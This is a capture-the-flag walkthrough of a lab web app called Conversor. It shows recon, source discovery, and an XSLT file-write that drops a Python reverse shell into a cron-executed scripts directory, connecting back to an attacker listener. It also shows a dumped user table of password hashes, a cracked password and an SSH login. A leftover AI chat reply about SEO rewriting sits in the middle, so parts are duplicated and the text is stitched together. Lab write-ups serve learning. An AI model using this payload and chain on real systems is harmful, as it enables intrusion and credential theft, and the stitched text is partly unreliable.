Conversor - TryHackMe Walkthrough

## Initial reconnaissance
I started with a quick service/version scan to see which ports were exposed and which services were running:
```
nmap -sV -sC 10.10.11.92
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://conversor.htb/
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
From that output I noted two open ports and the corresponding services:
* 22/tcp - ssh (OpenSSH 8.9p1)
* 80/tcp - http (Apache/2.4.52)

### Updating /etc/hosts
Because the HTTP server redirects to a host name (conversor.htb)
```
echo "10.10.11.92 conversor.htb" | sudo tee -a /etc/hosts
```
With the host entry added, I could browse to http://conversor.htb and run host-aware tools without DNS issues.

---

## Web enumeration - first pass
I opened the web site in the browser. The site initially showed a default login page with an option to register. I registered a new account and logged in to see what functionality was available.

<img width="1235" height="508" alt="image" src="https://github.com/user-attachments/assets/01e1ae19-052c-40e9-9613-f1261579ecac" />

After logging in I landed on a page that appeared to describe conversion functionality, the project was intended to convert nmap XML scan output into a visual analysis. The UI provided an option to download a template and upload scan results. That immediately flagged a potential file-handling feature worth enumerating safely.

<img width="1339" height="886" alt="image" src="https://github.com/user-attachments/assets/a8c85939-876e-4291-8eda-b998bb1b8656" />

To validate the workflow I downloaded the provided template and ran my own scan against the target IP to generate an XML file. The command I used was:
```
nmap -sC -sV 10.10.11.92 -oX Conversor
```
I uploaded both the downloaded template and my generated Conversor XML file through the web interface.

<img width="1276" height="806" alt="image" src="https://github.com/user-attachments/assets/3ae159db-9fe2-4770-b503-4633c97f3fea" />

When I inspected the uploaded template and the resulting output, the application returned a link (or processing result) that hinted at server-side XSLT/XSL processing of the uploaded XML. That suggested the app was taking the uploaded XML and transforming it with a server-side XSLT template behavior

<img width="1654" height="378" alt="image" src="https://github.com/user-attachments/assets/aa116238-2954-4a75-8f99-4fca17f7c1a4" />
---

## Exploitation

While the app accepted file uploads, I hunted for hidden endpoints to learn how uploads and conversions were handled. I ran a quick directory scan:
```
dirsearch -u 10.10.11.92
```
<img width="755" height="479" alt="image" src="https://github.com/user-attachments/assets/269ab409-c75b-4861-b263-7c80e6e46a35" />
The scan revealed an /about page - and that page included a link to download the full application source.

<img width="1306" height="849" alt="image" src="https://github.com/user-attachments/assets/8b098aaa-dab7-4a35-82f7-c4f8adc41a64" />

I immediately downloaded source_code.tar.gz and extracted it locally to inspect the implementation instead of guessing behavior from traffic:
```
tar -xvf source_code.tar.gz
```

<img width="800" height="564" alt="1_63l8a7aBgz_mdWX1RFMFkg" src="https://github.com/user-attachments/assets/c2a33e69-27ed-4402-94fd-3c7a35ef0dba" />

Flask + cron — quick summary for SEO: I found `install.md` and confirmed the app is a Python/Flask service (runnable with `python3 app.py` or under Apache/WSGI), so the web process likely runs as `www-data`. Crucially, a cron job executes every `*.py` in `/var/www/conversor.htb/scripts/` every minute — dropping a script there (or creating a writable symlink) yields code execution as `www-data`. Uploads are auto-deleted after 60 minutes, so timing is critical. Next, I created a reverse shell.

Got it — I cleaned up grammar and rewrote everything to be SEO-friendly. I did **not** add new exploit details beyond what you provided. Below are three polished sections you can drop into your walkthrough.

---

### Cron & runtime (SEO-optimized)

The app is a small Python/Flask service (runnable with `python3 app.py` or deployed under Apache/WSGI), so the web process likely runs as `www-data`. The key finding: a cron job runs every minute and executes any `*.py` in `/var/www/conversor.htb/scripts/`. In practice, placing a script there (or creating a writable symlink into it) provides reliable code execution as `www-data`. Note the app auto-deletes uploads older than 60 minutes, so payloads are ephemeral — timing matters when testing.

---

### Source & DB discovery (SEO-optimized)

I found `install.md` in the downloadable source archive and confirmed the app is a Python/Flask project (runs with `python3 app.py` or under Apache/WSGI), which implies the web process runs as `www-data`. The source also included an application database (`users.db`) in the instance/data directory, which helped me confirm how user accounts and uploaded files are tracked.

---

### Reverse shell 
The app’s XSLT processing can write files, and the cron job executing `*.py` in `/var/www/conversor.htb/scripts/` every minute gives a reliable foothold. Writing `shell.py` into that directory yields a shell when cron runs.

1. Create a simple XML for upload (save as `test.xml`):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<catalog>
  <cd>
    <title>Test</title>
    <artist>death</artist>
    <company>xyz Company</company>
    <price>1</price>
    <year>2300</year>
  </cd>
</catalog>
```

2. Create an XSLT payload (save as `test.xslt`) — **replace the IP and port with your listener**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
 xmlns:exploit="http://exslt.org/common"
 extension-element-prefixes="exploit"
 version="1.0">
  <xsl:template match="/">
    <exploit:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")
    </exploit:document>
  </xsl:template>
</xsl:stylesheet>
```

3. Start your netcat listener on your machine:

```
rlwrap nc -lnvp 4444
```

4. Upload **both** `test.xml` and `test.xslt` via the app’s upload/convert flow, then click the generated conversion link to trigger the XSLT processor. When cron executes `shell.py` in `/var/www/conversor.htb/scripts/`, your listener should receive the shell.

<img width="371" height="113" alt="image" src="https://github.com/user-attachments/assets/e3d07d4a-136e-4062-9710-bb4c7370d621" />

## Privilege Escalation
After gaining a foothold as `www-data`, I moved quickly to stabilize the shell and hunt for escalation paths.

I spawned a proper TTY to make interactive commands easier:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
From the web root I navigated the app directory and inspected files and folders:
```
cd /var/www/conversor.htb
ls -la
# app.py  app.wsgi  instance  __pycache__  scripts  static  templates  uploads
```
Inside the instance directory I found the bundled SQLite database and queried the users table:
```
cd instance
sqlite3 ./users.db "SELECT * FROM users;"
The dump returned multiple user records (id|username|password_hash), including a user fismathack:
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
5|huesos|7d58b345d95b5b021dc16fd5b48a8f8b
6|getfked|c91b9f8c0be4831296c0cbbb7c511557
7|lol|8f036369a5cd26454949e594fb9e0a2d
8|test|098f6bcd4621d373cade4e832627b4f6
9|admin|21232f297a57a5a743894a0e4a801fc3
10|shadow|3bf1114a986ba87ed28fc1b5884fc2f8b
```
Seeing password hashes, I exported the relevant hash and cracked it using an online cracking resource CrackStation to recover plaintext passwords.

<img width="1061" height="382" alt="image" src="https://github.com/user-attachments/assets/ad793427-adfe-4467-93bf-2d427f60ed26" />

The fismathack hash resolved to:
```
Keepmesafeandwarm
```
With credentials in hand I authenticated over SSH to the box:
```
ssh fismathack@10.10.10.10
# password: Keepmesafeandwarm
```
After logging in as fismathack I captured the user flag: 

<img width="259" height="74" alt="image" src="https://github.com/user-attachments/assets/7d7ce33f-1298-46fc-b62f-ffcf96e1f8e6" />
